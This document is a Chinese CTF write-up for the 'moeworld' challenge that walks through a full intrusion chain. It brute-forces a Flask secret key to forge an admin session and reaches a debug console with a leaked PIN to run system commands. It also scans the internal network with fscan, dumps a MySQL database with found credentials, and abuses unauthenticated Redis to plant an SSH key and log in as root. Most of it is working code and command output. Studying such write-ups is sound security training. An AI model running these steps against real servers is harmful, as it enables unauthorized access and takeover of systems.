# moeworld

首先爆破secret key
```py
import itertools
import zlib
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import base64_decode
#https://github.com/noraj/flask-session-cookie-manager
class MockApp(object):
	def __init__(self, secret_key):
		self.secret_key = secret_key
def encode(secret_key, session_cookie_structure):
	try:
		app = MockApp(secret_key)
		session_cookie_structure = session_cookie_structure
		si = SecureCookieSessionInterface()
		s = si.get_signing_serializer(app)
		return s.dumps(session_cookie_structure)
	except Exception as e:
		return "[Encoding error] {}".format(e)
def decode(session_cookie_value, secret_key=None):
	if (secret_key == None):
		compressed = False
		payload = session_cookie_value
		if payload.startswith('.'):
			compressed = True
			payload = payload[1:]
		data = payload.split(".")[0]
		data = base64_decode(data)
		if compressed:
			data = zlib.decompress(data)
		return data
	else:
		app = MockApp(secret_key)
		si = SecureCookieSessionInterface()
		s = si.get_signing_serializer(app)
		return s.loads(session_cookie_value)
cookie = ""
for c in itertools.product(range(0, 256), repeat=2):
	k = bytes(c).hex()
	try:
		print(decode(cookie, "This-random-secretKey-you-can't-get"+k))
	except Exception as e:
		pass
	else:
		print(k)
		break
```
secret key是`This-random-secretKey-you-can't-get06f0`,有了secret key就能自己修改session为admin。admin的private留言说pin码904-474-531，所以去到http://47.115.201.35:8000/console ，输入pin码则获得console

执行系统命令：
```py
import subprocess
subprocess.check_output(['ls','/'])
subprocess.check_output(['cat','/flag'])
```
获得第一部分flag：`moectf{Information-leakage-Is-dangerous!`

还有个readme，python decode后看到提示
```
恭喜你通过外网渗透拿下了本台服务器的权限
接下来，你需要尝试内网渗透，本服务器的/app/tools目录下内置了fscan
你需要了解它的基本用法，然后扫描内网的ip段
如果你进行了正确的操作，会得到类似下面的结果
10.1.11.11:22 open
10.1.23.21:8080 open
10.1.23.23:9000 open
将你得到的若干个端口号从小到大排序并以 - 分割，这一串即为hint.zip压缩包的密码（本例中，密码为：22-8080-9000）
注意：请忽略掉xx.xx.xx.1，例如扫出三个ip 192.168.0.1 192.168.0.2 192.168.0.3 ，请忽略掉有关192.168.0.1的所有结果！此为出题人服务器上的其它正常服务
对密码有疑问随时咨询出题人
```
提示用fscan，看一下help
```py
subprocess.check_output("/app/tools/fscan --help",stderr=subprocess.STDOUT,shell=True)
```
是这个工具： https://github.com/shadow1ng/fscan

看一下本机内网ip, 参考 https://blog.csdn.net/kuanggudejimo/article/details/99454185
```py
import socket;s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect(('8.8.8.8', 80));ip = s.getsockname()[0];print(ip)
```
得到ip为`172.21.0.2`。扫描：
```py
subprocess.check_output("/app/tools/fscan -h 127.21.0.2/24",stderr=subprocess.STDOUT,shell=True)
```
得到hint.zip密码： 22-3306-6379-8080

然后不要卡在怎么配置frp进行内网穿透，那个要自己开vps，或者要有个自己的公网ip。穿透只是辅助效果，帮助我们渗透更加方便，不配置直接用python console也是可以的。也不要想用ngrok免费版，免费版只能转发一个端口，而穿透至少要两个端口。直接去搞mysql：
```py
subprocess.check_output("cat dataSql.py",stderr=subprocess.STDOUT,shell=True)
```
得到sql数据库交互的源码，里面有用户名和密码。连接:
```py
db = pymysql.connect(host="mysql",port=3306,user="root",passwd="The_P0sswOrD_Y0u_Nev3r_Kn0w",database="messageboard",charset='utf8')
```
查内容：
```py
cursor=db.cursor()
cursor.execute("select database()")
cursor.fetchall()
(('messageboard'))
>>> cursor.execute("select(group_concat(table_name))from(information_schema.tables)where(table_schema)='messageboard'")
1
>>> cursor.fetchall()
(('flag,message,users'))
>>> cursor.execute("select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')")
1
>>> cursor.fetchall()
(('flag'))
>>> cursor.execute("select(group_concat(flag))from(flag)")
1
>>> cursor.fetchall()
(('-Are-YOu-myS0L-MasT3r?-'))
```
最后是redis。用python装个redis模块（不知道为啥apt-get install装不了？）：
```py
subprocess.check_output("pip3 install redis",stderr=subprocess.STDOUT,shell=True)
```
然后连接
```py
r = redis.Redis(host='172.20.0.3', port=6379, db=0)
r.info()
```
从info中得知redis存在未授权访问漏洞。根据 https://_thorns.gitbooks.io/sec/content/redis_getshellzi_dong_hua_shi_jian_zhi_ssh_key.html 往root写ssh key。public_key和privkey利用`ssh-keygen -t rsa`生成
```py
>>> r.set('aaaaaaaaaa', '\n\n' + public_key + '\n\n')
True
>>> r.config_set('dir', '/root/.ssh')
True
>>> r.config_set('dbfilename', 'authorized_keys')
True
>>> r.save()
True
```
参考 https://www.cnblogs.com/wongbingming/articles/12384764.html ，安装paramiko进行ssh连接
```py
subprocess.check_output("pip3 install paramiko",stderr=subprocess.STDOUT,shell=True)
import paramiko
>>> pkey = paramiko.RSAKey.from_private_key_file('privkey', password='')
>>> trans = paramiko.Transport(('172.20.0.3', 22))
>>> trans.connect(username='root', pkey=pkey)
>>> ssh = paramiko.SSHClient()
>>> ssh._transport = trans
>>> stdin, stdout, stderr = ssh.exec_command('ls /')
>>> print(stdout.read().decode())
>>> stdin, stdout, stderr = ssh.exec_command('cat /flag')
>>> print(stdout.read().decode())
```
## Flag
> moectf{Information-leakage-Is-dangerous!-Are-YOu-myS0L-MasT3r?-P@sSW0Rd-F0r-redis-Is-NeceSsary}